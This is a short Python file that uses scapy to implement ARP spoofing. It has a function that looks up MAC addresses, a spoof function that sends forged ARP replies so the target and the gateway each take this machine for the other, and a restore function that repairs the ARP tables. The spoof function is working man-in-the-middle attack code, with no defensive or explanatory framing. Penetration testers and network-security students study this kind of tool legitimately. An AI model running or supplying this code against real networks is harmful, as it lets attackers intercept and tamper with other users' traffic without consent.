import scapy.all as scapy
import time

def get_mac(ip):
    """
    Sends an ARP request to get the MAC address of a specific IP.
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, gateway_ip, target_mac, gateway_mac):
    """
    Sends spoofed ARP packets with explicit destination MACs to avoid warnings.
    """
    # Packet to target: "I am the gateway"
    # hwdst ensures the packet goes directly to the target, fixing the warning.
    target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    
    # Packet to gateway: "I am the target"
    gateway_packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    scapy.send(target_packet, verbose=False)
    scapy.send(gateway_packet, verbose=False)

def restore(destination_ip, source_ip):
    """
    Restores the network by sending the correct ARP details to the target and gateway.
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    
    # Send packet with the REAL MAC address to fix the ARP table
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
